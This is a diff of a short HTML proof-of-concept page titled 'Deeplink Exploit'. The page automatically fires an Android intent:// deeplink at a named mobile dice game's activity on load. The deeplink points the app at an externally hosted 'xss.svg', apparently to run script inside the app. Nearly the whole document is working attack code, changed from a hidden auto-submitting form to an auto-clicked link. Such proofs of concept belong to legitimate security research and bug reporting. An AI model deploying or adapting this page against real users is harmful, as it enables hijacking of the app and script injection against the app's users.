@@ -1,18 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Deeplink Exploit</title>
 </head>
 <body>
-    <!-- Hidden Form to Auto Submit the Intent -->
-    <form id="exploitForm" action="intent://ya3raj.github.io/bhuwanportfolio/xss.svg#Intent;scheme=https;package=com.withbuddies.dice.free;end;" method="get">
-    </form>
-
+    <a id="deeplink" href="intent://ya3raj.github.io/bhuwanportfolio/xss.svg#Intent;scheme=https;action=android.intent.action.VIEW;package=com.withbuddies.dice.free;component=com.withbuddies.dice.free/com.scopely.diceunity.DiceUnityActivity;end;">Trigger Deeplink</a>
     <script>
-        // Automatically submit the form on page load
-        document.getElementById("exploitForm").submit();
+        // Automatically trigger the deeplink when the page loads
+        document.getElementById("deeplink").click();
     </script>
 </body>
 </html>
